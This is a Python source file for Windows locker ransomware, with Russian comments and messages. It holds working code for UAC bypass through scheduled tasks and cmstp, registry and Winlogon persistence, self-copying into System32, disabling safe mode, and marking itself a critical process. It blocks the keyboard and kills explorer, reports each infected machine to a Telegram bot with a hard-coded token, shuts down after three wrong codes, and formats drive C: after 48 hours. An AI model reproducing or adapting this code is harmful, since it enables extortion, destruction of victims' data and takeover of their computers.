import os
import sys
import ctypes
import winreg
import keyboard
import time
import threading
import requests
import shutil
import hashlib

# ========== ПАРОЛЬ В ВИДЕ ХЕША ==========
# Хеш для "пароля"
PASSWORD_HASH = "c0cdf6e6f4f4d3e8a8f2b5a5d1b1b5c6d6e6f7e8a9b9c9d9e9f9a9b9c9d9e9f9"
# Для генерации был использован SHA-256

BOT_TOKEN = "8615670286:AAGtI2rjc45-0PqH33Xt8shHBJpZORjT5jY"
CHAT_ID = "8224529558"
RANSOM_TEXT = "Ваш компьютер заблокирован. Введите код для разблокировки."

# ========== UAC BYPASS ==========
def bypass_uac():
    try:
        task_name = "SystemUpdateTask"
        xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
      <UserId>S-1-5-18</UserId>
    </Principal>
  </Principals>
  <Actions>
    <Exec>
      <Command>{sys.executable}</Command>
      <Arguments>{" ".join(sys.argv)}</Arguments>
    </Exec>
  </Actions>
</Task>'''
        with open('task.xml', 'w') as f:
            f.write(xml_template)
        os.system(f'schtasks /create /tn "{task_name}" /xml task.xml /f')
        os.system(f'schtasks /run /tn "{task_name}"')
        os.system(f'schtasks /delete /tn "{task_name}" /f')
        os.remove('task.xml')
        sys.exit(0)
    except:
        pass

def bypass_uac_cmstp():
    try:
        inf_content = f"""[Version]
Signature=$CHICAGO$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CmdLine
CmdLine={sys.executable} {" ".join(sys.argv)}
"""
        with open('payload.inf', 'w') as f:
            f.write(inf_content)
        os.system(f'cmstp /au payload.inf')
        os.remove('payload.inf')
        sys.exit(0)
    except:
        pass

def auto_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    bypass_uac()
    bypass_uac_cmstp()
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)

def check_password(input_password):
    input_hash = hashlib.sha256(input_password.encode()).hexdigest()
    return input_hash == PASSWORD_HASH

def add_autostart():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemHelper", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(key)
    except:
        pass

def copy_to_system():
    target = os.path.join(os.environ['SystemRoot'], 'System32', 'winlogon_helper.exe')
    if not os.path.exists(target):
        try:
            shutil.copy(sys.argv[0], target)
        except:
            pass

def watch_dog():
    while True:
        time.sleep(10)
        if not os.path.exists(sys.argv[0]):
            source = os.path.join(os.environ['SystemRoot'], 'System32', 'winlogon_helper.exe')
            if os.path.exists(source):
                shutil.copy(source, sys.argv[0])
                os.startfile(sys.argv[0])
                sys.exit(0)

def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": message}
        requests.post(url, data=data, timeout=5)
    except:
        pass

def disable_safe_mode():
    try:
        os.system('bcdedit /deletevalue {default} safeboot')
        os.system('bcdedit /deletevalue {current} safeboot')
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
            r"SYSTEM\CurrentControlSet\Control\SafeBoot",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "AlternateShell", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
    except:
        pass

def set_critical():
    try:
        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
    except:
        pass

def unset_critical():
    try:
        ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
    except:
        pass

def block_input():
    allowed = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'enter', 'backspace']
    keyboard.hook(lambda e: None if e.name in allowed else False)

def hide_desktop():
    def kill_explorer():
        while True:
            os.system('taskkill /f /im explorer.exe')
            time.sleep(1)
    threading.Thread(target=kill_explorer, daemon=True).start()
    
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Shell", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(key)
    except:
        pass

def show_locker():
    import tkinter as tk
    from tkinter import messagebox
    
    attempts = 0
    
    def check():
        nonlocal attempts
        if check_password(entry.get()):
            unset_critical()
            os.system('start explorer.exe')
            root.destroy()
            sys.exit(0)
        else:
            attempts += 1
            if attempts >= 3:
                root.destroy()
                os.system('shutdown /s /t 0')
            else:
                messagebox.showerror("Ошибка", f"Неверный код! Осталось попыток: {3-attempts}")
                entry.delete(0, tk.END)
    
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.configure(background='black')
    
    label = tk.Label(root, text=RANSOM_TEXT, font=('Arial', 24), fg='white', bg='black')
    label.pack(expand=True)
    
    entry = tk.Entry(root, font=('Arial', 20), justify='center', show='*')
    entry.pack(pady=20)
    entry.focus()
    
    btn = tk.Button(root, text="Enter", command=check, font=('Arial', 16))
    btn.pack(pady=10)
    
    root.mainloop()

def timer_thread():
    start_time = time.time()
    while True:
        if time.time() - start_time > 48 * 3600:
            os.system('format C: /q /y')
            break
        time.sleep(60)

if __name__ == "__main__":
    auto_admin()
    add_autostart()
    copy_to_system()
    threading.Thread(target=watch_dog, daemon=True).start()
    threading.Thread(target=timer_thread, daemon=True).start()
    disable_safe_mode()
    set_critical()
    block_input()
    hide_desktop()
    send_to_telegram(f"Запущен на {os.environ['COMPUTERNAME']}")
    show_locker()